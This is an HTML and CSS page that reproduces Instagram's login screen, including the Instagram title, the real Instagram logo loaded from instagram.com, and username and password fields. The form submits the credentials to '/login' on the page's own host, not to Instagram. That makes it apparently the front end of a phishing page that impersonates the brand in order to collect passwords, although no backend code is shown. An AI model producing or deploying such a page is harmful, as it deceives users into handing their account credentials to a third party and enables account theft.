<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      width: 100%;
      max-width: 350px;
      padding: 20px;
    }

    .login-box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      width: 100%;
      padding: 40px 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .login-box img.logo {
      width: 175px;
      margin-bottom: 30px;
    }

    form {
      width: 100%;
      display: flex;
      flex-direction: column;
    }

    input[type="text"],
    input[type="password"] {
      background-color: #fafafa;
      border: 1px solid #dbdbdb;
      padding: 10px;
      margin-bottom: 10px;
      font-size: 14px;
      border-radius: 3px;
    }

    input[type="submit"] {
      background-color: #0095f6;
      border: none;
      color: white;
      padding: 10px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
      font-size: 14px;
      margin-top: 10px;
    }

    .separator {
      display: flex;
      align-items: center;
      margin: 20px 0;
    }

    .separator::before,
    .separator::after {
      content: "";
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .separator span {
      margin: 0 10px;
      color: #8e8e8e;
      font-size: 13px;
    }

    .signup-box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      width: 100%;
      padding: 20px 30px;
      text-align: center;
      font-size: 14px;
      margin-top: 10px;
    }

    .signup-box a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }

    @media (max-width: 600px) {
      .container {
        padding: 10px;
      }

      .login-box, .signup-box {
        padding: 20px 15px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo" />
      <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Phone number, username or email" required />
        <input type="password" name="password" placeholder="Password" required />
        <input type="submit" value="Log In" />
      </form>
      <div class="separator"><span>OR</span></div>
      <div style="font-size: 13px; color: #385185; font-weight: 500; cursor: pointer;">Log in with Facebook</div>
    </div>
    <div class="signup-box">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>
</body>
</html>
